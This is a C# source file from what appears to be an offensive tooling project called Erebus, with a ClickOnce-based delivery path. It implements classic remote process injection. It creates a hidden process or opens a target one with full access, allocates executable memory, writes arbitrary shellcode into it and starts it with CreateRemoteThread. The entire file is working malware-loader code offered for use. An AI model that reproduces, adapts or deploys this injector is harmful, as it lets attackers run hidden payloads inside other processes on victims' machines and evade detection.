using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class ClassicRemoteInjection : IInjectionMethod
    {
        public string Name => "Classic Remote Thread";
        public string Description => "Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread";

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                IntPtr hProcess;
                int pid;

                // If no PID specified, create a new process
                if (targetPid == 0)
                {
                    DebugLogger.WriteLine("[+] Creating new target process...");
                    Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    Win32.PROCESS_INFORMATION pi;
                    StringBuilder cmdLine = new StringBuilder(InjectionConfig.TargetProcess);

                    bool success = Win32.CreateProcess(
                        null!,
                        cmdLine,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Win32.CREATION_FLAGS.CREATE_NO_WINDOW,
                        IntPtr.Zero,
                        null!,
                        ref si,
                        out pi);

                    if (!success)
                    {
                        DebugLogger.WriteLine($"[-] Failed to create process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }

                    hProcess = pi.hProcess;
                    pid = pi.dwProcessId;

                    // Close the main thread handle as we don't need it right now
                    Win32.CloseHandle(pi.hThread);

                    DebugLogger.WriteLine($"[+] Target process created with PID: {pid}");
                }
                else
                {
                    DebugLogger.WriteLine($"[+] Opening target process PID: {targetPid}");
                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);

                    if (hProcess == IntPtr.Zero)
                    {
                        DebugLogger.WriteLine($"[-] Failed to open process: {Marshal.GetLastWin32Error()}");
                        return false;
                    }
                    pid = targetPid;
                }

                // Allocate memory in target process
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    (Win32.HANDLE)hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                    Win32.CloseHandle(hProcess);
                    return false;
                }

                DebugLogger.WriteLine($"[+] Memory allocated at: 0x{baseAddress:X}");

                // Write shellcode to target process
                unsafe
                {
                    fixed (byte* pShellcode = shellcode)
                    {
                        nuint written = 0;
                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
                            (Win32.HANDLE)hProcess,
                            (void*)baseAddress,
                            pShellcode,
                            (nuint)shellcode.Length,
                            &written);

                        if (!writeResult)
                        {
                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
                            Win32.CloseHandle(hProcess);
                            return false;
                        }

                        DebugLogger.WriteLine($"[+] Written {written} bytes to target process");
                    }
                }

                // Create remote thread
                DebugLogger.WriteLine("[+] Creating remote thread...");
                unsafe
                {
                    Win32.HANDLE hThread = Win32.CreateRemoteThread(
                        (Win32.HANDLE)hProcess,
                        null,
                        0,
                        baseAddress,
                        null,
                        Win32.THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
                        null);

                    if (hThread.IsNull)
                    {
                        DebugLogger.WriteLine($"[-] CreateRemoteThread failed: {Marshal.GetLastWin32Error()}");
                        Win32.CloseHandle(hProcess);
                        return false;
                    }

                    DebugLogger.WriteLine("[+] Remote thread created successfully");
                    Win32.CloseHandle(hThread);
                }

                Win32.CloseHandle(hProcess);
                DebugLogger.WriteLine("[+] Classic remote injection completed successfully");
                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] Classic remote injection failed: {ex.Message}");
                return false;
            }
        }
    }
}